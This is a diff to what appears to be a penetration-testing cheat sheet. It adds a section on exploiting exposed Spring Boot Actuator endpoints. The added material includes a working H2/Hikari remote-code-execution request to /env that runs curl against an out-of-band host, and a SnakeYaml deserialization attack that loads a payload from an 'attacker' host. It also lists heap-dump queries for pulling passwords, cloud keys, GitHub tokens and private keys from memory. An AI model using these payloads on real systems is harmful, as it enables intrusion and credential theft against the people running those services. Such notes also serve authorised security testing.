@@ -100,10 +100,77 @@
     - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md#payloads
 
 ### spring
-- check /actuator
-    - [spring-boot.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)
-    - visualvm
 
+- look for more paths, such as: /trace /httptrace
+#### /env
+##### A) hikari rce
+```
+POST /env HTTP/1.1
+Host: target.app
+Content-Type: application/json
+
+{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('curl  http://x.burpcollaborator.net');"}
+```
+- https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/
+
+##### B) exploiting SnakeYaml deseralization vulnerability
+- create yml to exploit snakeyaml vulnerability, more details in https://github.com/artsploit/yaml-payload or https://www.labs.greynoise.io/grimoire/2024-01-03-snakeyaml-deserialization/
+
+- set the yml in the config
+```http
+POST /env HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://attacker/yaml-payload.yml
+```
+
+- load the yml
+```http
+POST /refresh
+Host: target.com
+```
+
+#### /jolokia
+* check if there is **reloadByURL** in `/jolokia/list/`
+* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators
+* https://github.com/mpgn/Spring-Boot-Actuator-Exploit
+
+#### /heapdump
+
+- In VisualVM, use **References** and then **"Open in a new Tab"** to find interesting things.
+    - Try to recovery passwords/secrets from /env
+```sql
+/* interesting oql queries */
+select s from java.lang.String s where s.toString().contains("postgres")
+|| s.toString().contains("mysql")
+|| s.toString().contains("secret")
+|| s.toString().contains("authentication")
+|| s.toString().contains("bearer")
+|| s.toString().contains("basic")
+|| s.toString().contains("jwt")
+
+select s from java.lang.String s where s.toString().contains("eyJ")
+|| s.toString().contains("MII")
+|| s.toString().contains("AIza")
+|| s.toString().contains("AWS")
+|| s.toString().contains("AKIA")
+|| s.toString().contains("ASIA")
+|| s.toString().contains("ya29")
+|| s.toString().contains("amzn")
+|| s.toString().contains("github_pat_")
+|| s.toString().contains("ghp_")
+|| s.toString().contains("gho_")
+|| s.toString().contains("ghu_")
+|| s.toString().contains("ghs_")
+|| s.toString().contains("ghr_")
+|| s.toString().contains("cloudinary")
+|| s.toString().contains("EAACEdEose0cBA")
+|| s.toString().contains("PRIVATE KEY")
+|| s.toString().contains("bucket_password")
+|| s.toString().contains("app_key")
+|| s.toString().contains("apikey")
+```
 ### asp.net
 ```
 TODO
